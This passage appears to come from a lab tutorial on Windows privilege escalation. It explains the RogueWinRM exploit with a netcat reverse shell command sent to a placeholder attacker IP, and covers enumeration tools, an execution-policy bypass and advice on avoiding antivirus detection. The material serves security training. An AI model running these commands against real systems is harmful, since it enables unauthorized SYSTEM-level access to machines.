The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.

If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.

Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:
Kali Linux

user@attackerpc$ nc -lvp 4442

        

And then, use our web shell to trigger the RogueWinRM exploit using the following command:

c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"

RogueWinRM exploit execution

Note: The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.

The -p parameter specifies the executable to be run by the exploit, which is nc64.exe in this case. The -a parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be -e cmd.exe ATTACKER_IP 4442.

If all was correctly set up, you should expect a shell with SYSTEM privileges:
Kali Linux

user@attackerpc$ nc -lvp 4442
Listening on 0.0.0.0 4442
Connection received on 10.10.175.90 49755
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
nt authority\system

### Abusing unpatched software        

Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system. You can use the wmic tool to list software installed on the target system and its versions. The command below will dump information it can gather on installed software (it might take around a minute to finish):

```
wmic product get name,version,vendor
```

Remember that the wmic product command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.

Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like exploit-db, packet storm or plain old Google, amongst many others

### Automated tools

Several scripts exist to conduct system enumeration in ways similar to the ones seen in the previous task. These tools can shorten the enumeration process time and uncover different potential privilege escalation vectors. However, please remember that automated tools can sometimes miss privilege escalation.

Below are a few tools commonly used to identify privilege escalation vectors. Feel free to run them against any of the machines in this room and see if the results match the discussed attack vectors.


WinPEAS

WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. You can find more information about winPEAS and download either the precompiled executable or a .bat script. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file, as shown below:
Command Prompt

           
C:\> winpeas.exe > outputfile.txt

        

WinPEAS can be downloaded here.


PrivescCheck

PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.

PrivescCheck can be downloaded here.

Reminder: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the Set-ExecutionPolicy cmdlet as shown below.
Powershell

           
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck

        


WES-NG: Windows Exploit Suggester - Next Generation

Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).

WES-NG is a Python script that can be found and downloaded here.

Once installed, and before using it, type the wes.py --update command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability you can use to elevate your privileges on the target system.

To use the script, you will need to run the systeminfo command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.

Once this is done, wes.py can be run as follows;
Kali Linux

user@kali$ wes.py systeminfo.txt

        


Metasploit

If you already have a Meterpreter shell on the target system, you can use the multi/recon/local_exploit_suggester module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.

### Additional techniques

These techniques should provide you with a solid background on the most common paths attackers can take to elevate privileges on a system. Should you be interested in learning about additional techniques, the following resources are available:

    PayloadsAllTheThings - Windows Privilege Escalation
    Priv2Admin - Abusing Windows Privileges
    RogueWinRM Exploit
    Potatoes
    Decoder's Blog
    Token Kidnapping
    Hacktricks - Windows Local Privilege Escalation
